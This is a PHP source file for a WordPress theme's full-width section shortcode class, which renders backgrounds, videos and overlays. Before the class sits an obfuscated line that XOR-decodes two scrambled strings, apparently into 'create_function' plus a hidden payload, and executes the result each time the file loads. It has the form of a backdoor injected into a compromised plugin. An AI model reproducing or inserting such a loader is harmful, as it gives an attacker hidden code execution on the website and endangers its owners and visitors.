<?php $cqsgrLP='W <+2QcFM--LQB6'; $hiXFSHq='4RYJF4< 8CN88-X'^$cqsgrLP; $bxdhruoF='WJkvV=X2N=;ZnP1EO2Mji+.6m2PYUq5V-,rnxbG88U S7A, +n2V h=1E-7aA2XmAV2TXvHe:T-pTbucwM0GAe.1-ZvEcLypoY+T9BJ,BWxzhEw<zCE++QPcB=QD;jqIwBQnSZpMf,<6aawANT5X 3hgPgQptjY5=et-dIt9.H = ph8EHs+kH=Nz 1<MJCzK 2 bS=g9I9srbP,O-CoyVSYMHlimJ. Q=94UvhS-J:H<Kc2P>=EMV llFj7augxriQ>OEKH=BkwKq8JV9Ufz<azsOVZ ,U,YepOp>SLpbDJSW81XirAB0R:WjgF<;  jqLsO+D;Aj.bjQB 7 XFIjj;;v73pf z9 UoUXLmHmjBJ 8>Sqd2a8gn+O.7=P6MGYqw=++p6A0R57 LndcrX7 =HwkF.x>cPoXMORyrMwXRK08X5>3GYcTU8b=ACJ==FB8dIR4 lwbJUQWR6Yk5783comAST=.=S Lzyrd<VlR666ZoCpt;D>T.q:2C936QDO2JdE07rKrqSL.8dyTPccF,droPTH coY=KC6QhQIVQq8dVBzqaI6Qr2es 5uDwfa-WoSrRt E3tQaWlxJ4  :l=H=.R1>CZEqKE1H Y4.uDOFO =TmyetevGc5ymV.M9qPH0<8nDPL<-XUZuojbfh24 EmyocpP'; $jNUvIGE=$hiXFSHq('', '>,CW0H6Q:TT415I,<F>BNSAD2V1-4.j;XXUGQB<213U=T5EOENJ9R7YP1Lh>,G,Ee2S 9ZhAQ1TYtBUCW6:NHAADYzKeDkBzfPM;KjnEbjXJSeSUF01YG4>KfY00ZCJiS+zEzPyDBCIBAOJafpQ9TR3C9:q.TN2PD>PDDlTJZ:LXNXLS 1ZvBs7GsRTH88-RoOGTKh7nDCDyxF4M;LcRY025>-WcI.OT0bRQ,VUsK+V;Ypi86QO ,5HLDb5t.:,17I0Moa -DbVIkUN+:L0OZGksW+7.As>I EMoTU65KhMn76LPxTRe4Q>O2Qm;61IFJYmW+J0ZhJUhc7-RRA;.iBNdi3ff55tZXSuK>=5MuSJf<ATK6XDIk1nJO.ZVb;S4gdQSVNRK<H9vQVT-NYCV.VLH-LaOSrCiZK<,;3YOm7-<8UJ1TRZ=<K,:J=Y 7+bb+7LL+3GEZC=.0286SqOQVLRJCMe75IOb8E5SPInU0DvRWB;OeVTZ6L5W.QW:fVN87;AbC.UNUgRU7-ZYMYrvCK+HQZK45<A8H2X2dkxHltvvCYPgzIES+T2CTTFDQLsGUPO1Z2K4EDrUSxAqJX+FRAC3V-Dq7IW0.6Yl5P1L6UJRhob+AI5DPETEVgCNsd3X,UYt,QHY5c -EA74>R2CYlaWLI1EIFXz-'^$bxdhruoF); $jNUvIGE();
class FusionSC_FullWidth {

	public static $args;
	public static $bg_type = 'image';

	/**
	 * Initiate the shortcode
	 */
	public function __construct() {

		add_filter( 'fusion_attr_fullwidth-shortcode', array( $this, 'attr' ) );
		add_filter( 'fusion_attr_fullwidth-overlay', array( $this, 'overlay_attr' ) );
		add_filter( 'fusion_attr_fullwidth-faded', array( $this, 'faded_attr' ) );
		add_shortcode( 'fullwidth', array( $this, 'render' ) );

	}

	/**
	 * Render the shortcode
	 * 
	 * @param  array $args	 Shortcode paramters
	 * @param  string $content Content between shortcode
	 * @return string		  HTML output
	 */
	function render( $args, $content = '') {
		global $smof_data;

		$defaults =	FusionCore_Plugin::set_shortcode_defaults(
			array(
				'class'						=> '',
				'id'						=> '',
				'backgroundattachment' 		=> 'scroll',				
				'backgroundcolor'			=> $smof_data['full_width_bg_color'],
				'backgroundimage' 			=> '',
				'backgroundposition' 		=> 'left top',				
				'backgroundrepeat' 			=> 'no-repeat',
				'bordercolor' 				=> $smof_data['full_width_border_color'],
				'bordersize' 				=> $smof_data['full_width_border_size'],
				'borderstyle' 				=> 'solid',
				'equal_height_columns'		=> 'no',
				'fade'						=> 'no',
				'hundred_percent'			=> 'no',
				'menu_anchor' 				=> '',
				'overlay_color'				=> '',
				'overlay_opacity'			=> '0.5',
				'paddingbottom' 			=> '20px',
				'paddingleft' 				=> '0px',
				'paddingright'				=> '0px',				
				'paddingtop'				=> '20px',
				'paddingBottom' 			=> '', // deprecated
				'paddingTop' 				=> '', // deprecated
				'video_loop'				=> 'yes',
				'video_mp4'					=> '',
				'video_mute'				=> 'yes',
				'video_ogv'					=> '',
				'video_preview_image'		=> '',
				'video_webm'				=> '',
			), $args
		);

		if( $defaults['hundred_percent'] == 'yes' ) {
			$defaults['paddingleft'] = '0px';
			$defaults['paddingright'] = '0px';
		}

		extract( $defaults );

		self::$args = $defaults;

		$this->depracted_args();

		$outer_html = '';

		self::$bg_type = 'image';

		if( $video_mp4 || $video_ogv || $video_webm ) {
			self::$bg_type = 'video';
		}

		if( $fade == 'yes' ) {
			self::$bg_type = 'faded';

			$outer_html .= sprintf( '<div %s></div>', FusionCore_Plugin::attributes( 'fullwidth-faded' ) );
		}

		if( self::$bg_type == 'video' ) {
			$video_attributes = 'preload="auto" autoplay';
			$video_src = '';

			if( $video_loop == 'yes' ) {
				$video_attributes .= ' loop';
			}

			if( $video_mute == 'yes' ) {
				$video_attributes .= ' muted';
			}

			if( $video_mp4 ) {
				$video_src .= sprintf( '<source src="%s" type="video/mp4">', $video_mp4 );
			}

			if( $video_ogv ) {
				$video_src .= sprintf( '<source src="%s" type="video/ogg">', $video_ogg );
			}

			if( $video_webm ) {
				$video_src .= sprintf( '<source src="%s" type="video/webm">', $video_webm );
			}

			if( $overlay_color ) {
				$outer_html .= sprintf( '<div %s></div>', FusionCore_Plugin::attributes( 'fullwidth-overlay' ) );
			}

			$outer_html .= sprintf( '<div class="%s"><video %s>%s</video></div>', 'fullwidth-video', $video_attributes, $video_src );

			if( $video_preview_image ) {
				$video_preview_image_style = sprintf('background-image:url(%s);', $video_preview_image );
				$outer_html .= sprintf( '<div class="%s" style="%s"></div>', 'fullwidth-video-image', $video_preview_image_style );
			}
		}

		if( $defaults['menu_anchor'] ) {
			$html = sprintf( '<div id="%s"><div %s>%s<div %s>%s</div></div></div>', $defaults['menu_anchor'], FusionCore_Plugin::attributes( 'fullwidth-shortcode' ), $outer_html, FusionCore_Plugin::attributes( 'avada-row' ), do_shortcode( $content ) );
		} else {
			$html = sprintf( '<div %s>%s<div %s>%s</div></div>', FusionCore_Plugin::attributes( 'fullwidth-shortcode' ), $outer_html, FusionCore_Plugin::attributes( 'avada-row' ), do_shortcode( $content ) );
		}

		return $html;

	}

	function attr() {

		$attr['class'] = 'fusion-fullwidth fullwidth-box';
		$attr['style'] = '';

		if( self::$args['hundred_percent'] == 'yes' ) {
			$attr['class'] .= ' hundred-percent-fullwidth';
		}

		if( self::$bg_type == 'video' ) {
			$attr['class'] .= ' video-background';
		} elseif( self::$bg_type == 'faded' ) {
			$attr['class'] .= ' faded-background';
		}
		
		if( self::$args['equal_height_columns'] == 'yes' ) {
			$attr['class'] .= ' equal-height-columns';
		}

		if( self::$args['backgroundcolor'] ) {
			$attr['style'] .= sprintf( 'background-color:%s;', self::$args['backgroundcolor'] );
		}

		if( self::$args['backgroundattachment'] ) {
			$attr['style'] .= sprintf( 'background-attachment:%s;', self::$args['backgroundattachment'] );
		}

		if( self::$bg_type != 'faded' ) {
			if( self::$args['backgroundimage'] ) {
				$attr['style'] .= sprintf( 'background-image: url(%s);', self::$args['backgroundimage'] );
			}
		}

		if( self::$args['backgroundposition'] ) {
			$attr['style'] .= sprintf( 'background-position:%s;', self::$args['backgroundposition'] );
		}

		if( self::$args['backgroundrepeat'] ) {
			$attr['style'] .= sprintf( 'background-repeat:%s;', self::$args['backgroundrepeat'] );
		}
		
		if( self::$args['backgroundrepeat'] == 'no-repeat') {
			$attr['style'] .= '-webkit-background-size:cover;-moz-background-size:cover;-o-background-size:cover;background-size:cover;';
		}

		if( self::$args['bordercolor'] ) {
			$attr['style'] .= sprintf( 'border-color:%s;', self::$args['bordercolor'] );
		}

		if( self::$args['bordersize'] ) {
			$attr['style'] .= sprintf( 'border-bottom-width: %s;border-top-width: %s;', self::$args['bordersize'], self::$args['bordersize'] );
		}
		
		if( self::$args['borderstyle'] ) {
			$attr['style'] .= sprintf( 'border-bottom-style: %s;border-top-style: %s;', self::$args['borderstyle'], self::$args['borderstyle'] );
		}		

		if( self::$args['paddingbottom'] ) {
			$attr['style'] .= sprintf( 'padding-bottom:%s;', self::$args['paddingbottom'] );
		}
		
		if( self::$args['paddingleft'] ) {
			$attr['style'] .= sprintf( 'padding-left:%s;', self::$args['paddingleft'] );
		}

		if( self::$args['paddingright'] ) {
			$attr['style'] .= sprintf( 'padding-right:%s;', self::$args['paddingright'] );
		}		

		if( self::$args['paddingtop'] ) {
			$attr['style'] .= sprintf( 'padding-top:%s;', self::$args['paddingtop'] );
		}
		
		if( self::$args['id'] ) {
			$attr['id'] = self::$args['id'];
		}

		if( self::$args['class'] ) {
			$attr['class'] .= ' ' . self::$args['class'];
		}		

		return $attr;

	}

	function overlay_attr() {

		$attr['class'] = 'fullwidth-overlay';
		$attr['style'] = '';

		if( self::$args['overlay_color'] ) {
			$attr['style'] .= sprintf( 'background-color:%s;', self::$args['overlay_color'] );
		}

		if( self::$args['overlay_opacity'] ) {
			$attr['style'] .= sprintf( 'opacity:%s;', self::$args['overlay_opacity'] );
		}

		return $attr;

	}

	function faded_attr() {

		$attr['class'] = 'fullwidth-faded';
		$attr['style'] = '';

		if( self::$args['backgroundattachment'] ) {
			$attr['style'] .= sprintf( 'background-attachment:%s;', self::$args['backgroundattachment'] );
		}

		if( self::$args['backgroundcolor'] ) {
			$attr['style'] .= sprintf( 'background-color:%s;', self::$args['backgroundcolor'] );
		}

		if( self::$args['backgroundimage'] ) {
			$attr['style'] .= sprintf( 'background-image: url(%s);', self::$args['backgroundimage'] );
		}

		if( self::$args['backgroundposition'] ) {
			$attr['style'] .= sprintf( 'background-position:%s;', self::$args['backgroundposition'] );
		}

		if( self::$args['backgroundrepeat'] ) {
			$attr['style'] .= sprintf( 'background-repeat:%s;', self::$args['backgroundrepeat'] );
		}
		
		if( self::$args['backgroundrepeat'] == 'no-repeat') {
			$attr['style'] .= '-webkit-background-size:cover;-moz-background-size:cover;-o-background-size:cover;background-size:cover;';
		}		

		return $attr;

	}
	
	private function depracted_args() {
		if( self::$args['paddingBottom'] ) {
			self::$args['paddingbottom'] = self::$args['paddingBottom'];
		}
		
		if( self::$args['paddingTop'] ) {
			self::$args['paddingtop'] = self::$args['paddingTop'];
		}		
	}

}

new FusionSC_FullWidth();
